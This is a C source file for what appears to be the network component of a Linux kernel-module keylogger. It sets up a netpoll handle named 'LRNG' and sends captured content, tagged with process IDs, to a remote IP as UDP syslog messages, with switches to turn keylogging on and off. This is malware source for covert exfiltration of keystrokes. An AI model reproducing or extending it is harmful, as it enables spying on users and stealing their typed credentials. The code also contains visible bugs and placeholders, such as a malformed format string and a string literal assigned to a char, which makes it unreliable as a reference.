#include "hook.h"

#include <linux/netpoll.h>
#include <linux/inet.h>
#include <linux/sched.h> // for task struct and current
#include <linux/timekeeping.h> // time stamp for log msg

/************** Defines **************/

#define DEBUG_MODULE 	0

#if DEBUG_MODULE == 0
#undef DEBUG(f_, ...)
#define DEBUG(f_, ...)
#endif

// syslog parameters
#define MESSAGE_SIZE 1024
#define PRIVAL 6 // priority of message
#define VERSION 1 //TODO which one?? 
#define LOCAL_PORT 999
#define REMOTE_PORT 514 // according to syslog specification

//#define INADDR_LOCAL ((unsigned long int)0xc0a80a54) //192.168.10.84
//#define INADDR_SEND ((unsigned long int)0xc0a80a55) //192.168.10.85

/************ Data *******/

static struct netpoll *np = NULL;
static struct netpoll np_t;

static int log_flag = 1;
static int initialized_flag = 0;
/************ Implementation *******/

void turn_keylogging_on(void) {
	log_flag = 1;
}

void turn_keylogging_off(void) {
	log_flag = 0;
}

uint32_t convert_ip_v4(char *ip) {
	uint32_t u32_ip = 0;
	u8 tmp[4];
	int ret = in4_pton(ip, -1, tmp, -1, NULL);

	u32_ip |= tmp[0] & 0xFF;
	u32_ip <<= 8;
	u32_ip |= tmp[1] & 0xFF;
	u32_ip <<= 8;
	u32_ip |= tmp[2] & 0xFF;
	u32_ip <<= 8;
	u32_ip |= tmp[3] & 0xFF;

	DEBUG("%s converted to %du", ip, u32_ip);

	return u32_ip;
}

void initialize_keylogger(char *local_ip_v4, char *remote_ip_v4) {
	DEBUG("init keylogger");
	uint32_t u32_local_ip_v4 = convert_ip_v4(local_ip_v4);
	uint32_t u32_remote_ip_v4 = convert_ip_v4(remote_ip_v4);

	np_t.name = "LRNG";
	strlcpy(np_t.dev_name, "ens3", IFNAMSIZ);

	np_t.local_ip.ip = htonl(u32_local_ip_v4);
	np_t.local_ip.in.s_addr = htonl(u32_local_ip_v4);

	np_t.remote_ip.ip = htonl(u32_remote_ip_v4);
	np_t.remote_ip.in.s_addr = htonl(u32_remote_ip_v4);

	np_t.local_port = LOCAL_PORT;
	np_t.remote_port = REMOTE_PORT;

	memset(np_t.remote_mac, 0xff, ETH_ALEN);
	netpoll_print_options(&np_t);

	netpoll_setup(&np_t);
	np = &np_t;

	initialized_flag = 1;
}

void remove_keylogger(void){
	// TODO clean up
	initialized_flag = 0;
}

/**
 * format
 *
 * SYSLOG-MSG      = HEADER SP STRUCTURED-DATA [SP MSG]
 *
 * HEADER          = PRI VERSION SP TIMESTAMP SP HOSTNAME
 *                   SP APP-NAME SP PROCID SP MSGID
 * see RFC 5424
 */
char* create_sys_log_message(const char* content, char *ret){

	struct task_struct *task;
	char message[1024];
	char time_stamp[1024];
	char *proc_id;
	char *msg_id;

	struct timeval t;
	struct tm broken;
	do_gettimeofday(&t);
	//time_to_tm - converts the calendar time to local broken-down time
	time_to_tm(t.tv_sec, 0, &broken);
	//printk("%d:%d:%d:%ld\n", broken.tm_hour, broken.tm_min,
	//                        broken.tm_sec, t.tv_usec);
	task = current;
	(time_stamp[0]) = "1";
	sprintf(time_stamp, "%l-%d-%dT%d:%d.%dZ",broken.tm_year,broken.tm_mon,broken.tm_mday,broken.tm_hour,broken.tm_min,broken.tm_sec);
	// example from rfc 1985-04-12T23:20:50.52Z


	sprintf(message, "process:%d ### %s \n", task->pid, content);


	sprintf(ret, "<%d>%d %s %s %s [%s]", PRIVAL, VERSION, time_stamp, "todo:inserthsotname", "appname",message);

	return ret;

}


/*
 *
 */
void send_udp(const char* buf) {
	int msg_length = 0;
	char *msg;
	char ret[MESSAGE_SIZE];

	if (log_flag && initialized_flag) {
		msg = create_sys_log_message(buf, ret);
		//size of the send buf
		msg_length = strlen(msg);
		DEBUG("Message length is %d\n", msg_length);

		netpoll_send_udp(np, msg, msg_length);
	}
}


